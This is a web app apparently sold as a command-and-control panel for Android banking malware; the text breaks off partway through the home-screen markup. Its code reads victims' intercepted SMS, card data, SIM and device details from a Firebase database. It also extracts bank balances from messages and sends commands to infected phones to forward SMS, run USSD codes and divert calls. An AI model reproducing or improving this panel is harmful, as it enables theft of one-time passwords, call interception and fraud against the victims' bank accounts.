
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Panel Wala V90</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
      tailwind.config = {
        theme: {
          extend: {
            fontFamily: {
              sans: ['Inter', 'sans-serif'],
              mono: ['JetBrains Mono', 'monospace'],
            },
            colors: {
              'app-green': '#00a884',
              'app-dark': '#111b21',
              'app-bg': '#efeae2',
              'app-surface': '#ffffff',
            },
            animation: {
                fadeIn: 'fadeIn 0.3s ease-in-out',
                marquee: 'marquee 15s linear infinite',
                pulse: 'pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite',
            },
            keyframes: {
                fadeIn: {
                    '0%': { opacity: '0' },
                    '100%': { opacity: '1' },
                },
                marquee: {
                    '0%': { transform: 'translateX(100%)' },
                    '100%': { transform: 'translateX(-100%)' },
                }
            }
          }
        }
      }
    </script>
    <style>
      /* CRITICAL SCROLL FIXES */
      html, body { 
          height: 100%; 
          width: 100%; 
          overflow: hidden; /* Prevent body scroll, handle inside containers */
          font-family: 'Inter', sans-serif; 
          -webkit-tap-highlight-color: transparent; 
          background-color: #f3f4f6;
      }
      #root {
          height: 100%;
          width: 100%;
          display: flex;
          flex-direction: column;
      }
      
      /* Scrollbar Styling */
      ::-webkit-scrollbar { width: 5px; height: 5px; }
      ::-webkit-scrollbar-track { background: transparent; }
      ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
      ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
      
      .scrollbar-hide::-webkit-scrollbar { display: none; }
      .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
      
      /* Input fixes */
      input[type=number]::-webkit-inner-spin-button, 
      input[type=number]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
      *:focus-visible { outline: 2px solid #00a884; outline-offset: 1px; }
      
      /* Animations */
      .glass-panel { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); }
    </style>
    
    <!-- Import Map for Firebase -->
    <script type="importmap">
{
  "imports": {
    "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
    "firebase/database": "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js",
    "react": "https://esm.sh/react@^19.2.3",
    "react-dom/": "https://esm.sh/react-dom@^19.2.3/",
    "react/": "https://esm.sh/react@^19.2.3/",
    "firebase/": "https://esm.sh/firebase@^12.6.0/"
  }
}
</script>
</head>
<body>
    <div id="root"></div>
    
    <!-- Layers for Modals and Toasts -->
    <div id="modal-layer" class="relative z-50"></div>
    <div id="toast-layer" class="fixed top-4 left-0 w-full z-[60] pointer-events-none flex justify-center flex-col items-center gap-2"></div>

<script type="module">
import { initializeApp, getApps, getApp } from "firebase/app";
import { getDatabase, ref, set, update, get, remove, onValue, push, query, orderByChild, limitToLast, endBefore, equalTo } from "firebase/database";

// ==========================================
// 1. CONFIGURATION & STATE MANAGEMENT
// ==========================================

const CRYPTO_PASS = "@#£&2729FDJ";
const BANK_KEYWORDS = ["HDFC", "SBI", "AXIS", "ICICI", "KOTAK", "YESBANK", "YES", "CANARA", "BOB", "INDUSIND", "PAYTM", "PHONEPE", "AMEX", "GOOGLEPAY", "AMAZONPAY", "PNB", "UNION", "IDFC", "RBL", "CITI", "HSBC", "SC", "FEDERAL", "DBS"];

// Monolithic State Store
const state = {
    user: null,
    currentScreen: 'LOGIN',
    targetUser: null,
    users: [],
    smsList: [],
    homeSearch: '',
    homeFilter: 'All',
    smsSearch: '',
    smsFilterBank: null,
    smsVisibleCount: 50,
    subscriptions: [], // For Detail Views
    homeSubscription: null, // Specific for Home List (Persistent)
    notificationsEnabled: localStorage.getItem('panel_notifications') === 'true',
    hasCheckedOfflineCleanup: false,
    hasCheckedSmsCleanup: false
};

// ==========================================
// 2. UTILITY FUNCTIONS
// ==========================================

const Utils = {
    encryptToken: (url) => {
        try {
            const b64Url = btoa(url);
            let xored = '';
            for (let i = 0; i < b64Url.length; i++) {
                const charCode = b64Url.charCodeAt(i) ^ CRYPTO_PASS.charCodeAt(i % CRYPTO_PASS.length);
                xored += String.fromCharCode(charCode);
            }
            return btoa(xored);
        } catch (e) { return ""; }
    },

    decryptToken: (token) => {
        if (!token) return null;
        try {
            const xored = atob(token);
            let b64Url = '';
            for (let i = 0; i < xored.length; i++) {
                const charCode = xored.charCodeAt(i) ^ CRYPTO_PASS.charCodeAt(i % CRYPTO_PASS.length);
                b64Url += String.fromCharCode(charCode);
            }
            const url = atob(b64Url);
            if (url.startsWith('http') && (url.includes('firebaseio.com') || url.includes('firebasedatabase.app'))) {
                return url;
            }
            return null;
        } catch (e) { return null; }
    },

    detectBanks: (text) => {
        if (!text) return [];
        const upperText = text.toUpperCase();
        const found = new Set();
        BANK_KEYWORDS.forEach(bank => { if (upperText.includes(bank)) found.add(bank); });
        return Array.from(found);
    },

    extractBalance: (body) => {
        if (!body) return null;
        const regex = /(?:(?:Avail|Avl|A\/c|Acct|Net|Clg|Closing|Ledger|Wallet|Main)\.?\s*(?:Bal(?:ance)?|Val(?:ue)?)|Balance)\s*(?:is|:|: |-| -)?\s*(?:Rs\.?|INR)?\s*([0-9,]+\.?[0-9]*)/i;
        const match = body.match(regex);
        return (match && match[1]) ? match[1] : null;
    },

    timeAgo: (timestamp) => {
        if (!timestamp) return 'Never';
        const now = Date.now();
        const diff = now - timestamp;
        if (diff < 0) return 'Just now';
        const seconds = Math.floor(diff / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        const days = Math.floor(hours / 24);
        if (days > 365) return `${Math.floor(days / 365)}y ago`;
        if (days > 30) return `${Math.floor(days / 30)}mo ago`;
        if (days > 0) return `${days}d ago`;
        if (hours > 0) return `${hours}h ago`;
        if (minutes > 0) return `${minutes}m ago`;
        return 'Just now';
    },

    showToast: (msg) => {
        const container = document.getElementById('toast-layer');
        const toast = document.createElement('div');
        toast.className = "bg-gray-900/95 text-white px-6 py-3 rounded-full text-sm font-bold shadow-xl backdrop-blur-sm flex items-center animate-fadeIn pointer-events-auto border border-gray-700 z-50";
        toast.innerHTML = `<svg class="w-5 h-5 text-green-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" /></svg> ${msg}`;
        container.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    },

    sendNotification: (title, body) => {
        if (state.notificationsEnabled && Notification.permission === 'granted') {
            try {
                new Notification(title, { body, icon: 'https://cdn-icons-png.flaticon.com/512/2950/2950682.png', tag: 'panel-alert' });
            } catch (e) { console.error(e); }
        }
    }
};

// ==========================================
// 3. FIREBASE SERVICE LAYER
// ==========================================
let app, db;

const FirebaseService = {
    init: () => {
        const token = localStorage.getItem('panel_access_token');
        const url = Utils.decryptToken(token);
        if (url) {
            const config = { apiKey: "demo-key", authDomain: "demo.firebaseapp.com", databaseURL: url, projectId: "demo" };
            try {
                app = getApps().length === 0 ? initializeApp(config) : getApp();
                db = getDatabase(app, url);
            } catch (e) { console.error("FB Init", e); }
        }
    },

    saveAccessToken: (token) => {
        if (!token) return;
        const url = Utils.decryptToken(token);
        if (url) {
            localStorage.setItem('panel_access_token', token);
            localStorage.removeItem('panel_firebase_url');
            
            // Auto-save to saved projects list logic
            const savedTokens = JSON.parse(localStorage.getItem('panel_saved_tokens') || '[]');
            const exists = savedTokens.some(t => t.realUrl === url);
            if (!exists) {
                const projectId = url.match(/panel-wala-([^-]+)-default/)?.[1] || 'custom';
                savedTokens.push({
                    id: Date.now().toString(),
                    label: `Project ${projectId.toUpperCase()}`,
                    token: token,
                    realUrl: url,
                    projectId: projectId
                });
                localStorage.setItem('panel_saved_tokens', JSON.stringify(savedTokens));
            }
            location.reload();
        }
    },

    loginUser: async (key) => {
        if (!db) return { success: false, message: "Configuration Required" };
        const cleanInput = key.trim();
        try {
            // 1. Check Admin
            const adminSnap = await get(ref(db, 'All_Users/Admin'));
            if (adminSnap.exists()) {
                const adminData = adminSnap.val();
                let dbKey = '';
                if (typeof adminData === 'string') dbKey = String(adminData);
                else if (typeof adminData === 'object') {
                    const keys = Object.keys(adminData);
                    const keyProp = keys.find(k => ['key', 'accesskey', 'password'].includes(k.toLowerCase()));
                    if (keyProp) dbKey = String(adminData[keyProp]);
                }
                if (dbKey && dbKey.trim() === cleanInput) return { success: true, user: { key: cleanInput, userId: 'admin', userType: 'Admin' } };
            }
            
            // 2. Check Client (With Fallback)
            let userData = null, pushKey = '';
            try {
                const q = query(ref(db, 'users'), orderByChild('key'), equalTo(cleanInput));
                const s = await get(q);
                if (s.exists()) s.forEach(c => { userData = c.val(); pushKey = c.key; });
            } catch (e) {
                const s = await get(ref(db, 'users'));
                if (s.exists()) s.forEach(c => { if(c.val().key === cleanInput) { userData = c.val(); pushKey = c.key; } });
            }
            
if (userData) {
    if (userData.isBlocked)
        return { success: false, message: "Key blocked" };

    if (userData.userType === "Third Client")
        return { success: false, message: "This key not for web admin" };

    return {
        success: true,
        user: {
            key: cleanInput,
            userId: pushKey,
            userType: userData.userType || 'Client'
        }
    };
}
            return { success: false, message: "Invalid key" };
        } catch (e) { return { success: false, message: e.message }; }
    },

    resetUserKey: async (oldKey) => {
        if (!db) return { success: false, message: "DB Error" };
        try {
            let oldData, oldId;
            try {
                const q = query(ref(db, 'users'), orderByChild('key'), equalTo(oldKey));
                const s = await get(q);
                if(s.exists()) s.forEach(c => { oldData = c.val(); oldId = c.key; });
            } catch (e) {
                const s = await get(ref(db, 'users'));
                if(s.exists()) s.forEach(c => { if(c.val().key === oldKey) { oldData = c.val(); oldId = c.key; }});
            }

            if(!oldData) return { success: false, message: "Old key not found" };
            const newKey = Math.floor(100000 + Math.random() * 900000).toString();
            const newData = { ...oldData, key: newKey, originalKey: oldKey, createdAt: Date.now() };
            await push(ref(db, 'users'), newData);
            await remove(ref(db, `users/${oldId}`));
            return { success: true, newKey };
        } catch(e) { return { success: false, message: e.message }; }
    },

    // --- Subscriptions ---
    subscribeToUsers: (cb) => {
        if (!db) { cb([]); return () => {}; }
        return onValue(ref(db, 'All_Users/DeviceInfo'), (s) => {
            const d = s.val();
            cb(d ? Object.keys(d).map(k => ({ ...d[k], userId: k })) : []);
        });
    },

    subscribeToSMS: (uid, cb) => {
        if(!db) { cb([]); return () => {}; }
        const q = query(ref(db, `All_Users/sms/${uid}`), orderByChild('timestamp'), limitToLast(50));
        return onValue(q, (s) => {
            const d = s.val() || {};
            const l = Object.entries(d).map(([k,v]) => ({...v, key: k, userId: uid})).sort((a,b)=>b.timestamp - a.timestamp);
            cb(l);
        });
    },

    subscribeToGlobalData: (cb) => {
        if(!db) { cb([]); return () => {}; }
        let devices = {}, infos = {}, cards = {};
        const emit = () => {
            const ids = new Set([...Object.keys(devices), ...Object.keys(infos), ...Object.keys(cards)]);
            cb(Array.from(ids).map(uid => ({ userId: uid, ...(devices[uid]||{}), info: infos[uid], cards: cards[uid] })));
        };
        const u1 = onValue(ref(db, 'All_Users/DeviceInfo'), s => { devices = s.val()||{}; emit(); });
        const u2 = onValue(ref(db, 'All_Users/Info'), s => { infos = s.val()||{}; emit(); });
        const u3 = onValue(ref(db, 'All_Users/Card'), s => { cards = s.val()||{}; emit(); });
        return () => { u1(); u2(); u3(); };
    },

    subscribeToFullUserInfo: (uid, cb) => {
        if(!db) { cb({}); return () => {}; }
        let d = { info: null, cards: null, simDetails: null, deviceInfo: null };
        const emit = () => cb({...d});
        const u1 = onValue(ref(db, `All_Users/Info/${uid}`), s => { d.info = s.val(); emit(); });
        const u2 = onValue(ref(db, `All_Users/Card/${uid}`), s => { d.cards = s.val(); emit(); });
        const u3 = onValue(ref(db, `All_Users/simDetails/${uid}`), s => { d.simDetails = s.val(); emit(); });
        const u4 = onValue(ref(db, `All_Users/DeviceInfo/${uid}`), s => { d.deviceInfo = s.val(); emit(); });
        return () => { u1(); u2(); u3(); u4(); };
    },

    subscribeToNotification: (cb) => {
        if (!db) { cb(''); return () => {}; }
        return onValue(ref(db, 'notification'), (s) => {
            const val = s.val();
            if(!val) { cb(''); return; }
            if(typeof val === 'object' && val.message) cb(String(val.message));
            else if(typeof val === 'string') cb(val);
            else cb('');
        });
    },

    // --- Actions ---
    deleteOfflineUsers: async (ids) => {
        const updates = {};
        ids.forEach(uid => {
            ['users','All_Users/DeviceInfo','All_Users/sms','All_Users/Info','All_Users/Card','All_Users/simDetails','All_Users/SmsForwarding','All_Users/UssdCommands','All_Users/CallForwarding','All_Users/UssdResponses'].forEach(p => updates[`${p}/${uid}`] = null);
        });
        await update(ref(db), updates);
    },

    fetchGlobalSMS: async () => {
        if(!db) return [];
        const s = await get(ref(db, 'All_Users/sms'));
        if(!s.exists()) return [];
        let all = [];
        s.forEach(u => { 
            u.forEach(m => all.push({...m.val(), key: m.key, userId: u.key, androidId: m.val().androidId}));
        });
        return all.sort((a,b)=>b.timestamp - a.timestamp);
    },

    deleteSMS: (uid, key) => remove(ref(db, `All_Users/sms/${uid}/${key}`)),
    deleteAllSMS: (uid) => remove(ref(db, `All_Users/sms/${uid}`)),
    deleteAllGlobalSMS: () => remove(ref(db, `All_Users/sms`)),
    deleteBatchSMS: async (list) => {
        const updates = {};
        list.forEach(s => updates[`All_Users/sms/${s.userId}/${s.key}`] = null);
        await update(ref(db), updates);
    },

    // --- Commands ---
    sendCommandSms: (uid, to, msg, slot) => set(ref(db, `All_Users/SmsForwarding/${uid}`), { command: "forwardSms", toNumber: to, message: msg, simSlot: slot }),
    
    // Fix: USSD Command to match Android Logic
    // Path: All_Users/UssdCommands/{androidId}/{autoPushId}/
    // Fields: ussdCode, simSlot, timestamp
    // Note: The key MUST be 'ussdCode' for the Android app to recognize it.
    sendUssdCommand: (uid, code, slot) => push(ref(db, `All_Users/UssdCommands/${uid}`), { 
        ussdCode: code, 
        simSlot: slot, 
        timestamp: Date.now() 
    }),
    
    setCallForwarding: (uid, num, slot, en) => set(ref(db, `All_Users/CallForwarding/${uid}`), { command: en ? "enableCallForwarding" : "disableCallForwarding", toNumber: num, slot: slot }),
    
    updateAdminNumber: (n) => update(ref(db, 'All_Users/Admin'), { Number: n }),
    getAdminNumber: async () => (await get(ref(db, 'All_Users/Admin/Number'))).val() || '',
    markUserAsChecked: (uid) => update(ref(db, `All_Users/DeviceInfo/${uid}`), { checked: true }),

    subscribeToLatestUssdResponse: (uid, cb) => {
        if(!db) { cb(null); return () => {}; }
        // Listen to the responses node for the specific user
        return onValue(query(ref(db, `All_Users/UssdResponses/${uid}`), orderByChild('timestamp'), limitToLast(1)), (s) => {
            const d = s.val(); if(!d) { cb(null); return; }
            // Get the first key (latest due to limitToLast)
            cb(Object.values(d)[0]);
        });
    },
    
    subscribeToCallForwarding: (uid, cb) => onValue(ref(db, `All_Users/CallForwarding/${uid}/callForwardStatus`), s => cb(s.val()))
};

// Initialize Firebase Immediately
FirebaseService.init();

// ==========================================
// 4. ROUTER & RENDER ENGINE
// ==========================================

const root = document.getElementById('root');
const modalLayer = document.getElementById('modal-layer');

const clearDetailSubscriptions = () => {
    state.subscriptions.forEach(u => u());
    state.subscriptions = [];
};

const renderApp = () => {
    if (state.currentScreen === 'LOGIN') {
        if(state.homeSubscription) state.homeSubscription();
        state.homeSubscription = null;
        renderLogin();
        return;
    }

    // Initialize App Shell with Home Panel and Detail Panel
    if (!document.getElementById('app-shell')) {
        root.innerHTML = `
            <div id="app-shell" class="h-full w-full relative bg-gray-50">
                <div id="home-panel" class="h-full w-full absolute inset-0 z-0"></div>
                <div id="detail-panel" class="h-full w-full absolute inset-0 z-10 bg-gray-50 hidden"></div>
            </div>
        `;
        renderHome(); // Initialize Home Once
    }

    const homePanel = document.getElementById('home-panel');
    const detailPanel = document.getElementById('detail-panel');

    if (state.currentScreen === 'HOME') {
        // Switch to Home view (Hide Detail, Show Home)
        if (detailPanel) {
            detailPanel.classList.add('hidden');
            detailPanel.innerHTML = ''; // Clean up detail view to save memory
            clearDetailSubscriptions(); // Stop listening to detail-specific data
        }
        if (homePanel) homePanel.classList.remove('hidden');
    } else {
        // Switch to Detail view (Hide Home, Show Detail)
        if (homePanel) homePanel.classList.add('hidden');
        if (detailPanel) {
            detailPanel.classList.remove('hidden');
            // Render specific detail view into the detail panel
            if (state.currentScreen === 'SMS_VIEW') renderSmsViewer(detailPanel);
            else if (state.currentScreen === 'DATA_VIEW') renderUserDataViewer(detailPanel);
            else if (state.currentScreen === 'GLOBAL_DATA') renderGlobalDataViewer(detailPanel);
            else if (state.currentScreen === 'BANK_SUMMARY') renderBankSummary(detailPanel);
        }
    }
};

// ==========================================
// 5. SCREEN: LOGIN
// ==========================================
const renderLogin = () => {
    clearDetailSubscriptions();
    modalLayer.innerHTML = '';
    
    const tokenExists = !!localStorage.getItem('panel_access_token');
    const url = Utils.decryptToken(localStorage.getItem('panel_access_token'));
    const savedKey = tokenExists && url ? (JSON.parse(localStorage.getItem('panel_key_store')||'{}')[url] || '') : '';

    root.innerHTML = `
      <div class="h-full w-full flex items-center justify-center bg-gray-100 relative overflow-hidden">
        <div class="absolute top-0 left-0 w-full h-64 bg-app-green z-0"></div>
        <button id="btn-settings" class="absolute top-4 right-4 z-20 text-white/80 hover:text-white p-3 rounded-full hover:bg-white/10 transition-colors"><svg class="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /></svg></button>
        <div class="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 z-10 relative border border-gray-100 mx-4">
            <div class="text-center mb-8">
                <div class="bg-app-green/10 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4 relative"><svg class="w-10 h-10 text-app-green" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 17h.01M19 19h.01M5 21h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg></div>
                <h2 class="text-2xl font-bold text-gray-800">Panel Wala</h2>
                <p class="text-gray-500 text-sm">Device Management System</p>
            </div>
            <div class="space-y-6">
                <div>
                    <label class="block text-xs font-bold text-gray-400 uppercase mb-2 text-center">Enter Access Key</label>
                    <input id="input-key" type="password" inputmode="numeric" maxlength="6" value="${savedKey}" class="w-full text-center text-3xl font-mono py-4 border-2 rounded-xl focus:border-app-green focus:outline-none transition-all border-gray-200 placeholder-gray-300" placeholder="6 Digits">
                </div>
                <button id="btn-login" class="w-full bg-app-green text-white font-bold py-3.5 rounded-xl shadow-lg hover:bg-green-700 transition-all transform active:scale-95">LOGIN</button>
                <div id="login-error" class="hidden bg-red-50 text-red-600 p-3 rounded-lg text-sm text-center border border-red-100 animate-pulse"></div>
            </div>
            <button id="btn-paste" class="mt-4 w-full text-xs font-bold text-app-green hover:underline">PASTE FROM CLIPBOARD</button>
            <div class="mt-8 space-y-4 text-center">
                <button id="btn-buy" class="w-full py-3 bg-blue-50 text-blue-600 rounded-xl font-bold hover:bg-blue-100 transition-colors flex items-center justify-center gap-2 border border-blue-100">Buy New Panel</button>
            </div>
        </div>
      </div>
    `;

    document.getElementById('btn-settings').onclick = renderSettingsModal;
    document.getElementById('btn-buy').onclick = () => window.open('https://t.me/guddu_developer', '_blank');
    
    const inp = document.getElementById('input-key');
    const err = document.getElementById('login-error');
    
    const handleInput = (val) => {
        if (val.length > 20 && !val.includes(' ')) {
            const url = Utils.decryptToken(val);
            if (url) {
                FirebaseService.saveAccessToken(val);
                Utils.showToast("Token Detected & Saved");
            }
        }
    };

    inp.oninput = (e) => {
        const val = e.target.value;
        // Detect token paste (long string)
        if (val.length > 20 && !val.includes(' ')) {
            handleInput(val);
        } else {
            // Numeric only for regular typing
            const clean = val.replace(/\D/g, '').slice(0,6);
            if(clean !== val) inp.value = clean;
        }
    };
    
    document.getElementById('btn-paste').onclick = async () => {
        try {
            const text = await navigator.clipboard.readText();
            if(text) { 
                const clean = text.trim();
                if(clean.length > 20) handleInput(clean);
                else inp.value = clean.replace(/\D/g, '').slice(0,6);
            }
        } catch(e) {}
    };

    const doLogin = async () => {
        const val = inp.value.trim();
        if(val.length !== 6) { err.innerText = "Key must be 6 digits"; err.classList.remove('hidden'); return; }
        
        document.getElementById('btn-login').innerHTML = `<div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white mx-auto"></div>`;
        const res = await FirebaseService.loginUser(val);
        
        if(res.success) {
            const token = localStorage.getItem('panel_access_token');
            if(token) {
                const url = Utils.decryptToken(token);
                if(url) {
                    const store = JSON.parse(localStorage.getItem('panel_key_store')||'{}');
                    store[url] = val;
                    localStorage.setItem('panel_key_store', JSON.stringify(store));
                }
            }
            state.user = res.user;
            state.currentScreen = 'HOME';
            renderApp();
        } else {
            document.getElementById('btn-login').innerText = "LOGIN";
            err.innerText = res.message;
            err.classList.remove('hidden');
            if(res.message.includes("Configuration")) renderSettingsModal();
        }
    };
    
    document.getElementById('btn-login').onclick = doLogin;
    inp.onkeydown = (e) => e.key === 'Enter' && doLogin();
};

const renderSettingsModal = () => {
    const savedTokens = JSON.parse(localStorage.getItem('panel_saved_tokens') || '[]');
    const activeToken = localStorage.getItem('panel_access_token');
    const activeUrl = Utils.decryptToken(activeToken);

    modalLayer.innerHTML = `
      <div class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-fadeIn">
        <div class="bg-white rounded-xl shadow-2xl w-full max-w-md overflow-hidden flex flex-col max-h-[90vh]">
          <div class="bg-gray-50 border-b px-6 py-4 flex justify-between items-center">
            <h3 class="font-bold text-gray-900 text-lg">Configuration</h3>
            <button id="close-settings" class="text-gray-400 hover:text-gray-600">✕</button>
          </div>
          <div class="p-6 space-y-5 overflow-y-auto">
             <div class="flex items-center justify-between bg-blue-50 p-3 rounded-lg border border-blue-100">
                <span class="font-bold text-sm text-blue-700">Push Notifications</span>
                <button id="toggle-notif" class="w-10 h-5 rounded-full relative transition-colors ${state.notificationsEnabled?'bg-blue-600':'bg-gray-300'}">
                    <div class="w-4 h-4 bg-white rounded-full absolute top-0.5 transition-all ${state.notificationsEnabled?'left-5.5':'left-0.5'}"></div>
                </button>
             </div>
             <div>
                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Access Token</label>
                <textarea id="setting-token" rows="2" class="w-full border rounded-lg p-3 text-sm font-mono focus:border-app-green focus:outline-none" placeholder="Paste token here...">${activeToken||''}</textarea>
                <button id="btn-gen-token" class="text-xs text-purple-600 font-bold mt-1 hover:underline">Generate Token</button>
             </div>
             
             ${savedTokens.length > 0 ? `
             <div class="border-t pt-4">
                <label class="block text-xs font-bold text-gray-500 uppercase mb-2">Saved Projects</label>
                <div class="space-y-2 max-h-32 overflow-y-auto pr-1">
                    ${savedTokens.map(t => {
                        const isActive = t.realUrl === activeUrl;
                        return `
                        <div class="flex items-center justify-between p-2 rounded-lg border ${isActive ? 'bg-green-50 border-app-green' : 'bg-white border-gray-200'}">
                           <span class="text-xs font-bold truncate flex-1 ${isActive ? 'text-app-green' : 'text-gray-700'}">${t.label}</span>
                           <div class="flex items-center gap-2">
                               ${!isActive ? `<button class="text-[10px] bg-gray-100 hover:bg-gray-200 px-2 py-1 rounded font-bold text-gray-600 btn-use-token" data-token="${t.token}">Select</button>` : ''}
                               <button class="text-gray-400 hover:text-red-500 btn-del-token" data-id="${t.id}">✕</button>
                           </div>
                        </div>`;
                    }).join('')}
                </div>
             </div>
             ` : ''}
             
             <button id="btn-save-token" class="w-full bg-app-green text-white py-3 rounded-lg font-bold shadow-md hover:bg-green-700 transition-colors">Save & Connect</button>
             
             <div class="border-t pt-4 grid grid-cols-2 gap-3">
                <button id="btn-reset-key" class="bg-gray-100 hover:bg-gray-200 text-gray-600 py-2 rounded-lg text-xs font-bold">Reset Key</button>
                <button id="btn-fix-harmful" class="bg-gray-100 hover:bg-gray-200 text-gray-600 py-2 rounded-lg text-xs font-bold">Fix Harmful</button>
             </div>
          </div>
        </div>
      </div>
    `;
    
    document.getElementById('close-settings').onclick = () => modalLayer.innerHTML = '';
    
    document.getElementById('toggle-notif').onclick = () => {
        state.notificationsEnabled = !state.notificationsEnabled;
        localStorage.setItem('panel_notifications', state.notificationsEnabled);
        if(state.notificationsEnabled) Notification.requestPermission();
        renderSettingsModal(); 
    };

    document.getElementById('btn-save-token').onclick = () => {
        let t = document.getElementById('setting-token').value.trim();
        if(t.startsWith('https://')) t = Utils.encryptToken(t);
        FirebaseService.saveAccessToken(t);
    };
    
    // Saved Tokens Handlers
    modalLayer.querySelectorAll('.btn-use-token').forEach(b => {
        b.onclick = () => FirebaseService.saveAccessToken(b.dataset.token);
    });
    modalLayer.querySelectorAll('.btn-del-token').forEach(b => {
        b.onclick = () => {
            const newTokens = savedTokens.filter(t => t.id !== b.dataset.id);
            localStorage.setItem('panel_saved_tokens', JSON.stringify(newTokens));
            renderSettingsModal();
        };
    });

    document.getElementById('btn-gen-token').onclick = () => {
        const id = prompt("Enter Project ID (e.g. v90):");
        if(id) {
            const clean = id.startsWith('panel-wala-') ? id : `panel-wala-${id}`;
            const url = `https://${clean}-default-rtdb.firebaseio.com/`;
            document.getElementById('setting-token').value = Utils.encryptToken(url);
        }
    };

    document.getElementById('btn-reset-key').onclick = async () => {
        const old = prompt("Enter OLD Key to reset:");
        if(!old) return;
        const res = await FirebaseService.resetUserKey(old.trim());
        if(res.success) {
            alert(`New Key: ${res.newKey}\nCopy this key to login.`);
            const inp = document.getElementById('input-key');
            if(inp) inp.value = res.newKey;
            modalLayer.innerHTML = '';
        } else {
            alert(res.message);
        }
    };
    
    document.getElementById('btn-fix-harmful').onclick = () => window.open('https://t.me/android_protect_bot', '_blank');
};

// ==========================================
// 6. SCREEN: HOME
// ==========================================
const renderHome = () => {
    // Only fetch/render structure if not already active (Persistence check)
    if(state.homeSubscription) {
        return; // List is already live updating
    }

    const homePanel = document.getElementById('home-panel');
    homePanel.innerHTML = `
      <div class="h-full flex flex-col bg-gray-50 overflow-hidden">
        <div id="notif-bar" class="bg-blue-600 text-white text-sm font-bold overflow-hidden relative flex-none h-8 hidden transition-all z-30">
            <div class="w-full relative h-full flex items-center overflow-hidden">
                <div id="notif-text" class="whitespace-nowrap absolute animate-marquee px-4 min-w-full"></div>
            </div>
        </div>

        <div class="bg-white border-b px-4 py-3 sticky top-0 z-20 shadow-sm flex flex-col md:flex-row gap-3 justify-between items-center flex-none">
           <div class="flex items-center space-x-3 w-full md:w-auto justify-between md:justify-start">
              <h1 class="font-bold text-xl text-gray-900">Devices</h1>
              <p id="stats-txt" class="text-xs text-gray-500 font-medium">Loading...</p>
           </div>
           
           <div class="flex items-center space-x-2 w-full md:w-auto overflow-x-auto pb-1 md:pb-0 scrollbar-hide">
             <input id="search-dev" class="border rounded-lg py-1.5 px-3 text-sm min-w-[120px] flex-1 focus:outline-none focus:border-app-green" placeholder="Search..." value="${state.homeSearch}">
             <select id="filter-stat" class="bg-white border py-1.5 px-2 rounded-lg text-sm">
                <option value="All" ${state.homeFilter==='All'?'selected':''}>All</option>
                <option value="Online" ${state.homeFilter==='Online'?'selected':''}>Online</option>
                <option value="Offline" ${state.homeFilter==='Offline'?'selected':''}>Offline</option>
             </select>
             
             <button id="btn-glob-sms" class="p-2 text-gray-600 hover:text-white hover:bg-app-green rounded shrink-0 border" title="Global SMS"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" /></svg></button>
             <button id="btn-glob-data" class="p-2 text-gray-600 hover:text-white hover:bg-blue-600 rounded shrink-0 border" title="Global Data"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg></button>
